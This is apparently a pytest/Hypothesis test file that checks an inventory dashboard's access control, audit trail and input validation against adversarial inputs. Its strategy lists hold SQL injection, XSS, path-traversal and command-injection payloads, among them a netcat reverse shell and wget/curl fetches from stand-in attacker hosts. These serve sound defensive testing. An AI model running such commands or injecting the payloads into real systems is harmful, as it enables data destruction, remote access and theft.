"""
Property-based tests for security controls with adversarial inputs

Feature: dashboard-overhaul, Property 30: Compliance Reporting Accuracy
Feature: dashboard-overhaul, Enhanced security testing with adversarial inputs
Validates: Requirements 10.4, 10.5, 10.6, 12.1, 4.6, 10.7
"""

import pytest
from hypothesis import given, strategies as st, settings, assume
from unittest.mock import Mock, patch, MagicMock
import json
import sys
import os
import time
import hashlib
import hmac
import uuid
from datetime import datetime, timezone, timedelta
import base64

# Add lambda directory to path for imports
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..', 'lambda'))

from rbac_service.handler import RBACService, AuthorityMatrix
from audit_service.handler import AuditService
from shared.input_validator import InputValidator
from shared.errors import AuthenticationError, AuthorizationError, ValidationError


# Hypothesis strategies for adversarial testing

# Malicious user identifiers
malicious_user_id_strategy = st.one_of([
    st.text(alphabet='<>"\';(){}[]|\\`~!@#$%^&*+=', min_size=1, max_size=50),
    st.text(alphabet='abcdefghijklmnopqrstuvwxyz0123456789', min_size=100, max_size=1000),  # Very long
    st.just(''),  # Empty string
    st.just(None),  # None value
    st.text(alphabet='\x00\x01\x02\x03\x04\x05', min_size=1, max_size=10),  # Control characters
])

# SQL injection payloads
sql_injection_strategy = st.sampled_from([
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'/**/OR/**/1=1/**/--",
    "1; DELETE FROM inventory WHERE 1=1; --",
    "' UNION SELECT * FROM sensitive_data --",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "'; EXEC xp_cmdshell('dir'); --"
])

# XSS payloads
xss_payload_strategy = st.sampled_from([
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>"
])

# Command injection payloads
command_injection_strategy = st.sampled_from([
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& wget malicious.com/script.sh",
    "`whoami`",
    "$(curl evil.com)",
    "; nc -e /bin/sh attacker.com 4444",
    "| powershell -c \"Get-Process\"",
    "&& echo 'pwned' > /tmp/hacked"
])

# Path traversal payloads
path_traversal_strategy = st.sampled_from([
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
])

# Malicious JSON payloads
malicious_json_strategy = st.one_of([
    st.just('{"__proto__": {"isAdmin": true}}'),  # Prototype pollution
    st.just('{"constructor": {"prototype": {"isAdmin": true}}}'),
    st.text(min_size=10000, max_size=50000),  # Very large JSON
    st.just('{"a": ' + 'null,' * 1000 + '"b": 1}'),  # Deeply nested
])

# Compliance report types
compliance_report_types_strategy = st.sampled_from([
    'gdpr-data-export',
    'audit-trail-integrity',
    'access-control-matrix',
    'security-incident-summary',
    'financial-audit-trail',
    'user-activity-report',
    'system-configuration-changes'
])

# Time ranges for compliance reports
time_range_strategy = st.fixed_dictionaries({
    'start_date': st.datetimes(
        min_value=datetime(2024, 1, 1, tzinfo=timezone.utc),
        max_value=datetime(2024, 12, 31, tzinfo=timezone.utc)
    ).map(lambda dt: dt.isoformat()),
    'end_date': st.datetimes(
        min_value=datetime(2024, 1, 1, tzinfo=timezone.utc),
        max_value=datetime(2024, 12, 31, tzinfo=timezone.utc)
    ).map(lambda dt: dt.isoformat())
})


class TestComplianceReportingAccuracy:
    """
    Property 30: Compliance Reporting Accuracy
    
    For any compliance report generation request, the system SHALL produce 
    accurate reports based on audit data, support various regulatory requirements, 
    and maintain report generation audit trails for compliance verification.
    """
    
    @given(
        report_type=compliance_report_types_strategy,
        time_range=time_range_strategy,
        user_id=st.text(alphabet='abcdefghijklmnopqrstuvwxyz0123456789-', min_size=10, max_size=50),
        request_context=st.fixed_dictionaries({
            'ip_address': st.ip_addresses().map(str),
            'user_agent': st.text(min_size=10, max_size=100),
            'request_id': st.uuids().map(str)
        })
    )
    @settings(max_examples=3)
    def test_compliance_reports_are_accurate_and_audited(
        self, report_type, time_range, user_id, request_context
    ):
        """
        Property Test: Compliance reports are accurate and audited
        
        For any compliance report request, the system must generate accurate
        reports based on audit data and maintain audit trails of report generation.
        """
        with patch('audit_service.handler.boto3.resource') as mock_boto3_resource, \
             patch('audit_service.handler.boto3.client') as mock_boto3_client:
            
            # Mock DynamoDB and S3
            mock_table = Mock()
            mock_s3 = Mock()
            
            # Mock audit data for the time range
            mock_audit_data = [
                {
                    'PK': f'AUDIT#{time_range["start_date"][:10]}#{user_id}',
                    'SK': f'ACTION#{int(time.time())}#{uuid.uuid4()}',
                    'user_id': user_id,
                    'action_type': 'PURCHASE_ORDER_APPROVAL',
                    'resource_type': 'PURCHASE_ORDER',
                    'resource_id': 'PO-12345',
                    'timestamp': time_range['start_date'],
                    'ip_address': request_context['ip_address'],
                    'success': True,
                    'integrity_hash': hashlib.sha256(b'test-data').hexdigest()
                },
                {
                    'PK': f'AUDIT#{time_range["start_date"][:10]}#{user_id}',
                    'SK': f'ACTION#{int(time.time())}#{uuid.uuid4()}',
                    'user_id': user_id,
                    'action_type': 'BUDGET_ALLOCATION',
                    'resource_type': 'BUDGET',
                    'resource_id': 'BUDGET-Q1-2025',
                    'timestamp': time_range['start_date'],
                    'ip_address': request_context['ip_address'],
                    'success': True,
                    'integrity_hash': hashlib.sha256(b'test-budget-data').hexdigest()
                }
            ]
            
            mock_table.query.return_value = {'Items': mock_audit_data}
            mock_table.put_item.return_value = {}
            
            mock_resource = Mock()
            mock_resource.Table.return_value = mock_table
            mock_boto3_resource.return_value = mock_resource
            mock_boto3_client.return_value = mock_s3
            
            audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
            
            # Generate compliance report
            report_data = audit_service.generate_compliance_report(
                report_type, time_range, user_id, request_context
            )
            
            # Verify report structure
            assert 'report_id' in report_data
            assert 'report_type' in report_data
            assert report_data['report_type'] == report_type
            assert 'generated_at' in report_data
            assert 'generated_by' in report_data
            assert report_data['generated_by'] == user_id
            assert 'time_range' in report_data
            assert 'data_integrity_verified' in report_data
            assert 'audit_entries_count' in report_data
            
            # Verify data accuracy
            assert report_data['audit_entries_count'] == len(mock_audit_data)
            assert report_data['data_integrity_verified'] is True
            
            # Verify report generation was audited
            mock_table.put_item.assert_called()
            audit_call = mock_table.put_item.call_args[1]['Item']
            assert audit_call['action_type'] == 'COMPLIANCE_REPORT_GENERATION'
            assert audit_call['user_id'] == user_id
            assert audit_call['resource_type'] == 'COMPLIANCE_REPORT'
            assert report_type in audit_call['resource_id']
    
    @given(
        report_type=compliance_report_types_strategy,
        malicious_time_range=st.fixed_dictionaries({
            'start_date': st.one_of([
                st.just('"; DROP TABLE audit; --'),
                st.just('<script>alert("xss")</script>'),
                st.just('../../etc/passwd'),
                st.just('null'),
                st.just('')
            ]),
            'end_date': st.one_of([
                st.just('1\' OR \'1\'=\'1'),
                st.just('javascript:alert(1)'),
                st.just('$(rm -rf /)'),
                st.just('undefined'),
                st.just('9999-99-99T99:99:99Z')
            ])
        }),
        user_id=st.text(alphabet='abcdefghijklmnopqrstuvwxyz0123456789-', min_size=10, max_size=50)
    )
    @settings(max_examples=3)
    def test_compliance_reports_reject_malicious_inputs(
        self, report_type, malicious_time_range, user_id
    ):
        """
        Property Test: Compliance reports reject malicious inputs
        
        For any compliance report request with malicious time range inputs,
        the system must reject the request and log the attempt.
        """
        with patch('audit_service.handler.boto3.resource') as mock_boto3_resource:
            mock_table = Mock()
            mock_table.put_item.return_value = {}
            
            mock_resource = Mock()
            mock_resource.Table.return_value = mock_table
            mock_boto3_resource.return_value = mock_resource
            
            audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
            
            # Attempt to generate report with malicious inputs
            with pytest.raises((ValidationError, ValueError)) as exc_info:
                audit_service.generate_compliance_report(
                    report_type, malicious_time_range, user_id, {}
                )
            
            # Verify malicious input was rejected
            assert 'validation' in str(exc_info.value).lower() or 'invalid' in str(exc_info.value).lower()
            
            # Verify security incident was logged
            mock_table.put_item.assert_called()
            audit_call = mock_table.put_item.call_args[1]['Item']
            assert audit_call['action_type'] == 'SECURITY_INCIDENT'
            assert 'malicious_input' in audit_call['details']


class TestAuthorityMatrixEnforcementUnderEdgeCases:
    """
    Enhanced authority matrix enforcement testing with edge cases and adversarial inputs
    """
    
    @given(
        malicious_role=st.one_of([
            sql_injection_strategy,
            xss_payload_strategy,
            command_injection_strategy,
            st.text(min_size=1000, max_size=5000),  # Very long role names
            st.just(''),  # Empty role
            st.just(None)  # None role
        ]),
        resource=st.text(alphabet='abcdefghijklmnopqrstuvwxyz-_', min_size=1, max_size=50),
        action=st.sampled_from(['view', 'act', 'approve', 'configure']),
        user_id=st.text(alphabet='abcdefghijklmnopqrstuvwxyz0123456789-', min_size=10, max_size=50)
    )
    @settings(max_examples=3)
    def test_authority_matrix_rejects_malicious_roles(
        self, malicious_role, resource, action, user_id
    ):
        """
        Property Test: Authority matrix rejects malicious role inputs
        
        For any malicious role input, the authority matrix must reject the
        request and log the security incident.
        """
        with patch('rbac_service.handler.boto3.client') as mock_boto3:
            # Mock Cognito client to return malicious role
            mock_cognito = Mock()
            if malicious_role is not None and malicious_role != '':
                mock_cognito.admin_list_groups_for_user.return_value = {
                    'Groups': [{'GroupName': malicious_role}]
                }
            else:
                mock_cognito.admin_list_groups_for_user.return_value = {'Groups': []}
            mock_boto3.return_value = mock_cognito
            
            with patch('rbac_service.handler.audit_logger') as mock_audit_logger:
                rbac_service = RBACService('test-pool-id', 'us-east-1')
                
                # Test permission validation with malicious role
                is_authorized, user_role, audit_details = rbac_service.validate_user_permissions(
                    user_id, f'{user_id}@test.com', resource, action, {}
                )
                
                # Verify access is denied
                assert not is_authorized, f"Malicious role should be denied: {malicious_role}"
                
                # Verify security incident was logged
                mock_audit_logger.log_action.assert_called()
                call_args = mock_audit_logger.log_action.call_args
                
                # Check if it's logged as a security incident
                if malicious_role and any(char in str(malicious_role) for char in '<>"\';(){}[]|\\`~!@#$%^&*+='):
                    assert call_args[1]['action_type'] in ['RBAC_ACCESS_CHECK', 'SECURITY_INCIDENT']
    
    @given(
        role=st.sampled_from(['inventory-manager', 'warehouse-manager', 'supplier-coordinator']),
        malicious_resource=st.one_of([
            sql_injection_strategy,
            xss_payload_strategy,
            path_traversal_strategy,
            st.text(min_size=1000, max_size=5000)  # Very long resource names
        ]),
        action=st.sampled_from(['view', 'act', 'approve', 'configure']),
        user_id=st.text(alphabet='abcdefghijklmnopqrstuvwxyz0123456789-', min_size=10, max_size=50)
    )
    @settings(max_examples=3)
    def test_authority_matrix_rejects_malicious_resources(
        self, role, malicious_resource, action, user_id
    ):
        """
        Property Test: Authority matrix rejects malicious resource inputs
        
        For any malicious resource input, the authority matrix must reject
        the request and log the security incident.
        """
        with patch('rbac_service.handler.boto3.client') as mock_boto3:
            mock_cognito = Mock()
            mock_cognito.admin_list_groups_for_user.return_value = {
                'Groups': [{'GroupName': role}]
            }
            mock_boto3.return_value = mock_cognito
            
            with patch('rbac_service.handler.audit_logger') as mock_audit_logger:
                rbac_service = RBACService('test-pool-id', 'us-east-1')
                
                # Test permission validation with malicious resource
                is_authorized, user_role, audit_details = rbac_service.validate_user_permissions(
                    user_id, f'{user_id}@test.com', malicious_resource, action, {}
                )
                
                # Verify access is denied for malicious resource
                assert not is_authorized, f"Malicious resource should be denied: {malicious_resource}"
                
                # Verify audit logging occurred
                mock_audit_logger.log_action.assert_called()
    
    @given(
        concurrent_users=st.lists(
            st.text(alphabet='abcdefghijklmnopqrstuvwxyz0123456789-', min_size=10, max_size=50),
            min_size=5,
            max_size=20,
            unique=True
        ),
        resource=st.text(alphabet='abcdefghijklmnopqrstuvwxyz-_', min_size=1, max_size=50),
        action=st.sampled_from(['view', 'act', 'approve', 'configure'])
    )
    @settings(max_examples=2)
    def test_authority_matrix_handles_concurrent_access_attempts(
        self, concurrent_users, resource, action
    ):
        """
        Property Test: Authority matrix handles concurrent access attempts
        
        For any number of concurrent users attempting access, the authority
        matrix must handle all requests consistently and log all attempts.
        """
        with patch('rbac_service.handler.boto3.client') as mock_boto3:
            mock_cognito = Mock()
            # All users have inventory-manager role
            mock_cognito.admin_list_groups_for_user.return_value = {
                'Groups': [{'GroupName': 'inventory-manager'}]
            }
            mock_boto3.return_value = mock_cognito
            
            with patch('rbac_service.handler.audit_logger') as mock_audit_logger:
                rbac_service = RBACService('test-pool-id', 'us-east-1')
                
                results = []
                for user_id in concurrent_users:
                    is_authorized, user_role, audit_details = rbac_service.validate_user_permissions(
                        user_id, f'{user_id}@test.com', resource, action, {}
                    )
                    results.append((user_id, is_authorized, user_role))
                
                # Verify all users got consistent results
                expected_result = AuthorityMatrix.can_perform_action('inventory-manager', resource, action)
                for user_id, is_authorized, user_role in results:
                    assert is_authorized == expected_result, (
                        f"Inconsistent result for user {user_id}: expected {expected_result}, got {is_authorized}"
                    )
                    assert user_role == 'inventory-manager'
                
                # Verify all attempts were logged
                assert mock_audit_logger.log_action.call_count == len(concurrent_users)


class TestAuditTrailIntegrityUnderAttackScenarios:
    """
    Enhanced audit trail integrity testing under various attack scenarios
    """
    
    @given(
        malicious_audit_data=st.fixed_dictionaries({
            'user_id': malicious_user_id_strategy,
            'action_type': st.one_of([
                sql_injection_strategy,
                xss_payload_strategy,
                st.text(alphabet='ABCDEFGHIJKLMNOPQRSTUVWXYZ_', min_size=1, max_size=100)
            ]),
            'resource_type': st.one_of([
                command_injection_strategy,
                path_traversal_strategy,
                st.text(alphabet='ABCDEFGHIJKLMNOPQRSTUVWXYZ_', min_size=1, max_size=50)
            ]),
            'resource_id': st.one_of([
                malicious_json_strategy,
                st.text(min_size=10000, max_size=50000),  # Very large data
                st.text(alphabet='\x00\x01\x02\x03\x04\x05', min_size=1, max_size=10)  # Control chars
            ])
        })
    )
    @settings(max_examples=3)
    def test_audit_trail_rejects_malicious_data(self, malicious_audit_data):
        """
        Property Test: Audit trail rejects malicious data
        
        For any malicious audit data, the audit service must reject the
        data, sanitize inputs, or handle the data safely without corruption.
        """
        with patch('audit_service.handler.boto3.resource') as mock_boto3_resource:
            mock_table = Mock()
            mock_table.put_item.return_value = {}
            
            mock_resource = Mock()
            mock_resource.Table.return_value = mock_table
            mock_boto3_resource.return_value = mock_resource
            
            audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
            
            # Add required fields
            audit_entry = {
                **malicious_audit_data,
                'timestamp': datetime.utcnow().isoformat(),
                'ip_address': '192.168.1.100',
                'success': True
            }
            
            try:
                # Attempt to log malicious data
                audit_service.log_user_action(audit_entry)
                
                # If logging succeeds, verify data was sanitized
                mock_table.put_item.assert_called()
                stored_data = mock_table.put_item.call_args[1]['Item']
                
                # Verify dangerous characters were handled
                for field_name, field_value in stored_data.items():
                    if isinstance(field_value, str):
                        # Check that dangerous patterns are not present in raw form
                        assert '<script>' not in field_value.lower()
                        assert 'drop table' not in field_value.lower()
                        assert '../' not in field_value
                        
            except (ValidationError, ValueError) as e:
                # Rejection is also acceptable for malicious data
                assert 'validation' in str(e).lower() or 'invalid' in str(e).lower()
    
    @given(
        audit_entries=st.lists(
            st.fixed_dictionaries({
                'user_id': st.text(alphabet='abcdefghijklmnopqrstuvwxyz0123456789-', min_size=10, max_size=50),
                'action_type': st.sampled_from(['PURCHASE_ORDER_APPROVAL', 'BUDGET_ALLOCATION', 'USER_LOGIN']),
                'resource_type': st.sampled_from(['PURCHASE_ORDER', 'BUDGET', 'USER_SESSION']),
                'resource_id': st.text(alphabet='abcdefghijklmnopqrstuvwxyz0123456789-', min_size=5, max_size=20),
                'amount': st.integers(min_value=1, max_value=100000)
            }),
            min_size=3,
            max_size=10
        )
    )
    @settings(max_examples=2)
    def test_audit_trail_detects_tampering_attempts(self, audit_entries):
        """
        Property Test: Audit trail detects tampering attempts
        
        For any set of audit entries, if any entry is modified after creation,
        the integrity verification must detect the tampering.
        """
        with patch('audit_service.handler.boto3.resource') as mock_boto3_resource:
            mock_table = Mock()
            mock_table.put_item.return_value = {}
            
            mock_resource = Mock()
            mock_resource.Table.return_value = mock_table
            mock_boto3_resource.return_value = mock_resource
            
            audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
            
            # Log all entries and calculate integrity hashes
            original_hashes = []
            for entry in audit_entries:
                # Add required fields
                complete_entry = {
                    **entry,
                    'timestamp': datetime.utcnow().isoformat(),
                    'ip_address': '192.168.1.100',
                    'success': True
                }
                
                audit_service.log_user_action(complete_entry)
                
                # Calculate integrity hash
                entry_json = json.dumps(complete_entry, sort_keys=True)
                integrity_hash = hashlib.sha256(entry_json.encode()).hexdigest()
                original_hashes.append((complete_entry, integrity_hash))
            
            # Simulate tampering with one entry
            if original_hashes:
                tampered_entry, original_hash = original_hashes[0]
                tampered_entry_copy = tampered_entry.copy()
                
                # Tamper with the amount field
                if 'amount' in tampered_entry_copy:
                    tampered_entry_copy['amount'] = tampered_entry_copy['amount'] * 10
                
                # Calculate tampered hash
                tampered_json = json.dumps(tampered_entry_copy, sort_keys=True)
                tampered_hash = hashlib.sha256(tampered_json.encode()).hexdigest()
                
                # Verify tampering is detected
                assert original_hash != tampered_hash, "Tampering should be detected through hash mismatch"
                
                # Verify integrity validation would fail
                is_valid = audit_service.verify_audit_integrity(
                    tampered_entry_copy, original_hash
                )
                assert not is_valid, "Integrity verification should fail for tampered data"
    
    @given(
        time_window=st.integers(min_value=1, max_value=3600),  # 1 second to 1 hour
        attack_frequency=st.integers(min_value=10, max_value=1000)  # 10 to 1000 attempts
    )
    @settings(max_examples=2)
    def test_audit_trail_handles_high_frequency_attacks(self, time_window, attack_frequency):
        """
        Property Test: Audit trail handles high-frequency attacks
        
        For any high-frequency attack scenario, the audit service must
        continue to function and log all attempts without data loss.
        """
        with patch('audit_service.handler.boto3.resource') as mock_boto3_resource:
            mock_table = Mock()
            mock_table.put_item.return_value = {}
            
            mock_resource = Mock()
            mock_resource.Table.return_value = mock_table
            mock_boto3_resource.return_value = mock_resource
            
            audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
            
            # Simulate high-frequency attack
            attack_entries = []
            for i in range(min(attack_frequency, 50)):  # Limit for test performance
                attack_entry = {
                    'user_id': f'attacker-{i:03d}',
                    'action_type': 'UNAUTHORIZED_ACCESS_ATTEMPT',
                    'resource_type': 'SECURITY_BOUNDARY',
                    'resource_id': f'attack-{i:03d}',
                    'timestamp': datetime.utcnow().isoformat(),
                    'ip_address': f'192.168.1.{100 + (i % 155)}',
                    'success': False,
                    'failure_reason': 'malicious_request_detected'
                }
                attack_entries.append(attack_entry)
                
                # Log the attack attempt
                audit_service.log_user_action(attack_entry)
            
            # Verify all attacks were logged
            assert mock_table.put_item.call_count == len(attack_entries)
            
            # Verify audit service is still functional after attack
            normal_entry = {
                'user_id': 'normal-user-001',
                'action_type': 'USER_LOGIN',
                'resource_type': 'USER_SESSION',
                'resource_id': 'session-12345',
                'timestamp': datetime.utcnow().isoformat(),
                'ip_address': '10.0.1.50',
                'success': True
            }
            
            audit_service.log_user_action(normal_entry)
            
            # Verify normal operation continues
            assert mock_table.put_item.call_count == len(attack_entries) + 1


class TestAdvancedInputValidationSecurity:
    """
    Advanced input validation testing with sophisticated attack vectors
    """
    
    @given(
        polyglot_payload=st.sampled_from([
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            "\"><img src=x onerror=alert('XSS')>",
            "'; DROP TABLE users; SELECT '<script>alert(\"XSS\")</script>' --",
            "{{7*7}}[[7*7]]${7*7}<%=7*7%>#{{7*7}}"  # Template injection
        ])
    )
    @settings(max_examples=3)
    def test_input_validation_blocks_polyglot_attacks(self, polyglot_payload):
        """
        Property Test: Input validation blocks polyglot attacks
        
        For any polyglot payload (combining multiple attack vectors),
        the input validator must block or sanitize the input.
        """
        validator = InputValidator()
        
        # Register schema for testing
        schema = {
            'type': 'object',
            'properties': {
                'comment': {'type': 'string', 'maxLength': 1000},
                'description': {'type': 'string', 'maxLength': 2000}
            },
            'required': ['comment']
        }
        validator.register_schema('polyglot_test', schema)
        
        test_data = {
            'comment': polyglot_payload,
            'description': polyglot_payload
        }
        
        try:
            # Attempt validation
            result = validator.validate_input(test_data, 'polyglot_test')
            
            # If validation succeeds, verify dangerous content was sanitized
            if 'comment' in result:
                sanitized_comment = result['comment']
                assert '<script>' not in sanitized_comment.lower()
                assert 'javascript:' not in sanitized_comment.lower()
                assert 'drop table' not in sanitized_comment.lower()
                assert 'onerror=' not in sanitized_comment.lower()
                
        except ValidationError:
            # Rejection is acceptable for polyglot attacks
            pass
    
    @given(
        unicode_attack=st.sampled_from([
            "＜script＞alert('XSS')＜/script＞",  # Full-width characters
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",  # Unicode escapes
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",  # Hex escapes
            "\u202e<script>alert('XSS')</script>",  # Right-to-left override
            "\\u0000<script>alert('XSS')</script>"  # Null byte injection
        ])
    )
    @settings(max_examples=3)
    def test_input_validation_handles_unicode_attacks(self, unicode_attack):
        """
        Property Test: Input validation handles Unicode-based attacks
        
        For any Unicode-based attack payload, the input validator must
        properly decode and validate the content.
        """
        validator = InputValidator()
        
        schema = {
            'type': 'object',
            'properties': {
                'text_field': {'type': 'string', 'maxLength': 500}
            },
            'required': ['text_field']
        }
        validator.register_schema('unicode_test', schema)
        
        test_data = {'text_field': unicode_attack}
        
        try:
            result = validator.validate_input(test_data, 'unicode_test')
            
            # Verify Unicode attacks were handled
            if 'text_field' in result:
                sanitized_text = result['text_field']
                # Check for common dangerous patterns after Unicode normalization
                normalized_text = sanitized_text.lower().replace('＜', '<').replace('＞', '>')
                assert '<script>' not in normalized_text
                
        except ValidationError:
            # Rejection is acceptable for Unicode attacks
            pass


if __name__ == '__main__':
    pytest.main([__file__, '-v', '-s'])